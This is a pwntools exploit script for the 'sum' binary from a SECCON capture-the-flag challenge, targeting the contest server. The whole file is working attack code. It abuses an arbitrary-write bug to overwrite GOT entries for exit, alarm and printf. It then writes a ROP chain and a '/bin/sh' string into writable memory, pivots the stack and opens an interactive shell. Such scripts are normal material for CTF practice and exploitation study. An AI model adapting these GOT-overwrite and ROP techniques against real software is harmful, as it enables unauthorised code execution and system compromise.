#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
from subprocess import Popen, PIPE
from time import sleep
import sys

binary_file = './sum'
libc_file   = '/lib/x86_64-linux-gnu/libc.so.6'
#libc_file   = 'libc.so'

context.arch = 'amd64'
context.os   = 'linux'
context.terminal = ['tmux', 'split-window', '-h']

binary = ELF(binary_file)
libc   = ELF(libc_file)
env = { "LD_PRELOAD": libc_file }

gdbscript = '''
file {binary_file}
gef

# commands for fork-server
# set follow-fork-mode child
# set follow-fork-mode parent

# load structure info
# add-symbol-file symbol.o 0

# code base address and heap base address when PIC is enabled
set $code = 0x555555554000
set $heap = 0x555555757000

# define functions here

# define breakpoints here
#b *0x400998
'''.replace('{binary_file}', binary_file)

def u64x(data):
    return u64(data.ljust(8, '\0'))

def p64x(*nums):
    data = ''
    for num in nums:
        data += p64(num)
    return data

just_ret = 0x004005ee

add_rsp_8_pop_regs = 0x400a36
mov_regs_call_got  = 0x400a20
free_space = 0x0000000000601000 + 0x500

class Three:
    def __init__(self, _got, _edi, _rsi, _rdx):
        self.got = _got
        self.edi = _edi
        self.rsi = _rsi
        self.rdx = _rdx

def callThree(*args):
    dummy = p64(0xdeadbeefcafebabe)
    payload = p64(add_rsp_8_pop_regs)
    for three in args:
        payload += dummy # add rsp, 8
        payload += p64(0) # rbx
        payload += p64(1) # rbp
        payload += p64(three.got) # r12
        payload += p64(three.rdx) # r13
        payload += p64(three.rsi) # r14
        payload += p64(three.edi) # r15d
        payload += p64(mov_regs_call_got) # ret
    payload += dummy * 7
    #payload += dummy * 2 + p64(free_space) + dummy * 4
    return payload


def main():
    if len(sys.argv) == 2 and sys.argv[1] == '--local':
        tube = process([binary_file], env=env, stderr=sys.stderr)
    elif len(sys.argv) == 2 and sys.argv[1] == '--attach':
        tube = process([binary_file], env=env, stderr=sys.stderr)
        gdb.attach(tube, gdbscript=gdbscript)
    elif len(sys.argv) == 2 and sys.argv[1] == '--remote':
        tube = remote('sum.chal.seccon.jp', 10001)
        #tube = ssh('user', 'gimme-yourshell.ctf.insecurity-insa.fr', password='deadbeef', port=2225)
        #tube.run(binary_file)
    else:
        tube = gdb.debug([binary_file], aslr=False, env=env, gdbscript=gdbscript)

    one_gadget_offset =  0x4f2c5
    one_gadget_offset =  0x4f322
    one_gadget_offset = 0x10a38c

    pop_rdi_ret = 0x00400a43
    pop_rbp_ret = 0x004006d8
    leave_ret   = 0x004007eb

    long_str_82 = 0x400a70
    long_str_59 = 0x400a70 + 82 - 59 + 1

    # exit -> main
    payload = (str(binary.symbols.main-3) + ' 1 1 1 '+ str(-binary.got.exit) +' '+ str(binary.got.exit))
    sleep(0.1)
    tube.sendline(payload)

    # alarm -> alarm + 5 (syscall)
    plus5 = 0x4511223344556677
    payload = (str(plus5-3) + ' 1 1 1 ' + str(-binary.got.alarm+7) + ' ' + str(binary.got.alarm-7))
    sleep(0.1)
    tube.sendline(payload)

    # printf -> pop rdi; ret
    payload = str(pop_rdi_ret-3) + ' 1 1 1 ' + str(-binary.got.printf) + ' ' + str(binary.got.printf)
    tube.sendline(payload)

    binsh = free_space + 0x100
    rop = p64(0) # dummy
    rop += p64x(pop_rdi_ret, long_str_59, binary.plt.puts) # rax = 59
    rop += callThree(Three(binary.got.alarm, 0, 0, binsh))

    # build rop chain on the free space
    for i in range(len(rop) // 8):
        val = u64(rop[8*i:8*i+8])
        addr = free_space + 8*i
        payload = str(val-3) + ' 1 1 1 ' + str(-addr) + ' ' + str(addr)
        sleep(0.1)
        tube.sendline(payload)
    print('Finished to build rop chain')

    # set "/bin/sh\0"
    val = u64x('/bin/sh\0')
    addr = binsh
    payload = str(val-3) + ' 1 1 1 ' + str(-addr) + ' ' + str(addr)
    sleep(0.1)
    tube.sendline(payload)

    # trigger printf and execute stack pivot
    payload = str(pop_rbp_ret) + ' ' + str(free_space) + ' ' + str(leave_ret) + ' 0'
    sleep(0.1)
    tube.sendline(payload)

    tube.interactive()

if __name__ == '__main__':
    main()
